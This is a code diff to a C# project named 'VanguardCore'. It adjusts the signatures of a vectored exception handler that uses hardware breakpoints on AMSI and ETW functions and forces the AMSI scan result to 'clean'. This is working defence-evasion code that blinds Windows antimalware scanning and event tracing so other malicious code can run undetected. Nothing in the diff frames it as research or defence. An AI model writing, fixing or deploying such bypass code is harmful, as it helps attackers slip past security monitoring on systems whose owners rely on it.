@@ -40,14 +40,14 @@ namespace VanguardCore
 
                 if (_amsiAddr == null && _etwAddr == null) return;
 
-                _vehHandle = AddVectoredExceptionHandler(1, (delegate* unmanaged<EXCEPTION_POINTERS*, long>)&ExceptionHandler);
+                _vehHandle = AddVectoredExceptionHandler(1, (IntPtr)(delegate* unmanaged<EXCEPTION_POINTERS*, int>)&ExceptionHandler);
                 ApplyHWBP();
             }
             catch { }
         }
 
         [UnmanagedCallersOnly]
-        private static long ExceptionHandler(EXCEPTION_POINTERS* exceptions)
+        private static int ExceptionHandler(EXCEPTION_POINTERS* exceptions)
         {
             if (exceptions->ExceptionRecord->ExceptionCode == 0x80000004) // STATUS_SINGLE_STEP
             {
@@ -64,10 +64,10 @@ namespace VanguardCore
                         ulong resultPtr = *(ulong*)(exceptions->ContextRecord->Rsp + 0x20);
                         if (resultPtr != 0) *(uint*)resultPtr = 0; // AMSI_RESULT_CLEAN
                     }
-                    return -1; // EXCEPTION_CONTINUE_EXECUTION
+                    return -1; // EXCEPTION_CONTINUE_EXECUTION (EXCEPTION_CONTINUE_EXECUTION = -1)
                 }
             }
-            return 0; // EXCEPTION_CONTINUE_SEARCH
+            return 0; // EXCEPTION_CONTINUE_SEARCH (EXCEPTION_CONTINUE_SEARCH = 0)
         }
 
         public static void ApplyHWBP()
@@ -87,7 +87,7 @@ namespace VanguardCore
 
         #region Native Imports
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode)] private static extern IntPtr LoadLibraryW(string lpFileName);
-        [DllImport("kernel32.dll")] private static extern IntPtr AddVectoredExceptionHandler(uint First, delegate* unmanaged<EXCEPTION_POINTERS*, long> Handler);
+        [DllImport("kernel32.dll")] private static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);
         [DllImport("kernel32.dll")] private static extern IntPtr GetCurrentThread();
         [DllImport("kernel32.dll")] private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
         [DllImport("kernel32.dll")] private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
